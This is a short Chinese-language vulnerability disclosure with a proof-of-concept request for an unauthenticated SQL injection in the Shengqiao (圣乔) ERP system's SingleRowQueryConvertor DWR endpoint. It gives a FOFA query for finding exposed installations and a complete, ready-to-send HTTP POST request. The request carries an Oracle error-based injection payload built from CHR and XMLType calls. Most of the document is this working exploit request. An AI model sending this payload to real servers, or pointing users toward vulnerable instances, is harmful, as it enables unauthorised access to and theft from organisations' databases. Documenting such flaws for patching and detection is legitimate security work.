圣乔ERP系统 SingleRowQueryConvertor接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息
资产测绘：
FOFA：title="圣乔ERP系统"
测试：	


poc验证代码
POST /erp/dwr/call/plaincall/SingleRowQueryConvertor.queryForString.dwr HTTP/1.1
Host: 
Content-Type: text/plain
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Priority: u=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0

callCount=1
page=/erp/dwr/test/SingleRowQueryConvertor
httpSessionId=
scriptSessionId=D528B0534A8BE018344AB2D54E02931D86
c0-scriptName=SingleRowQueryConvertor
c0-methodName=queryForString
c0-id=0
c0-param0=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(122)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)
c0-param1=Array:[]
batchId=0
